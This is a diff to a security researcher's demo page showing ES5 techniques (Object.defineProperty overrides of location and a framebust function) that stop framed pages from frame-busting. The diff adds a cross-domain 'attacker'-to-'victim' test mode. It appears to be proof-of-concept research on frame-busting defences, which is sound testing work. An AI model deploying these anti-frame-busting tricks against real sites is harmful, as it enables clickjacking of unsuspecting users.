@@ -33,7 +33,8 @@ dd {
 <h1>Same-domain ES5 iframe anti-frame-busting</h1>
 <h2>By <a href="http://blog.kotowicz.net">Krzysztof Kotowicz</a></h2>
 <script>
-var overload = function(f,method) {
+my_real_location = location.href;
+var overload = function(f,method,crossdomain) {
     var w = f.contentWindow, // window
         d = f.contentDocument || f.contentWindow.document; // document
     $(f).load(function() { // this one is too late, after js already executed in frame
@@ -47,7 +48,7 @@ var overload = function(f,method) {
 	Object.defineProperty(w, "location",{ writable: false, configurable: false, value: { reload: function () {}, href: "" }}); // works in firefox same-domain, ie9+, cant confirm IE
 
 	// beats top.location=self.location
-        Object.defineProperty(window, "location", {writable: false});  // beats top.location = self.location, ff
+        Object.defineProperty(window, "location", {writable: false, configurable: false});  // beats top.location = self.location, ff
 
         // beats whole framebust() function call
 	Object.defineProperty(w, "framebust",{ configurable: false, set: function(v) {}, get: function() { // firefox
@@ -60,10 +61,13 @@ var overload = function(f,method) {
        //alert('no support for Object.defineProperty');
     }
 
-    var base_url = 'framed.php?method=' + method;
-//    f.src = location.href.replace('attacker','victim').replace(/\/[^/]*$/,'/framed.php');
-    // apparently you need to be fast here, no delays, maybe about:blank loading interferes
-    f.src = base_url;    
+    // apparently you need to be fast here, no delays, maybe about:blank loading interfers
+    var url = 'framed.php?method=' + method;
+    if (crossdomain) {
+	f.src = my_real_location.replace('attacker','victim').replace(/\/[^/]*$/,'/'+url);
+    } else {
+        f.src = url;    
+    }
 };
 
 var methods = [
@@ -74,11 +78,12 @@ var methods = [
     , baseurl
     , launcher = $('<a href=#>').click(function() { 
     $("<iframe>").insertAfter(this);
-    overload(this.nextSibling,this.rel);
+    overload(this.nextSibling,this.rel, $(this).data('cd'));
     return false; 
 });
 
 for (var i=0; i<methods.length; i++) {
+    launcher.clone(true).attr('rel', methods[i]).text(methods[i] + " crossdomain ").data('cd', true).appendTo('body');
     launcher.clone(true).attr('rel', methods[i]).text(methods[i]).appendTo('body');
 }
 </script>
